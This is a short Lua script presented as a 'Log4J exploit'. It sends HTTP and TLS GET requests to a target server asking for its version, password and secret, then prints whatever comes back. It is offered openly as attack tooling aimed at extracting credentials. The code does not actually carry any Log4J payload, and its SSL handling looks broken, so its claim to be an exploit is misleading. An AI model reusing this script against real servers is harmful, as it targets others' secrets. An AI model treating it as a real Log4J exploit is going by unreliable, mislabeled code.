--[[
Log4J exploit in Lua
]]--


local luasocket = require("socket")
local luasec = require("ssl")

local host = arg[1] or "127.0.0.1"
local port = arg[2] or "8080"
local path = arg[3] or "/log4j-server/log4j-webapp"

local function send_request(host, port, request)
	local sock = luasocket.connect(host, port)
	if not sock then return end
	sock:send(request)
	local response = sock:receive()
	sock:close()
	return response
end

local function send_request_ssl(host, port, request)
	local sock = luasec.wrap(luasocket.tcp())
	if not sock then return end
	sock:connect(host, port)
	sock:send(request)
	local response = sock:receive()
	sock:close()
	return response
end

local function send_payload(host, port, payload)
	local request = string.format("GET %s/%s HTTP/1.1\r\nHost: %s\r\n\r\n", path, payload, host)
	return send_request(host, port, request)
end

local function send_payload_ssl(host, port, payload)
	local request = string.format("GET %s/%s HTTP/1.1\r\nHost: %s\r\n\r\n", path, payload, host)
	return send_request_ssl(host, port, request)
end

local function get_payload(host, port, payload)
	local response = send_payload(host, port, payload)
	if not response then return end
	return string.match(response, "^%s*(.-)%s*$")
end

local function get_payload_ssl(host, port, payload)
	local response = send_payload_ssl(host, port, payload)
	if not response then return end
	return string.match(response, "^%s*(.-)%s*$")
end

local function get_version(host, port)
	return get_payload(host, port, "version") or get_payload_ssl(host, port, "version")
end

local function get_password(host, port)
	return get_payload(host, port, "password") or get_payload_ssl(host, port, "password")
end

local function get_secret(host, port)
	return get_payload(host, port, "secret") or get_payload_ssl(host, port, "secret")
end

print("Log4J version: " .. (get_version(host, port) or "unknown"))
print("Log4J password: " .. (get_password(host, port) or "unknown"))
print("Log4J secret: " .. (get_secret(host, port) or "unknown"))
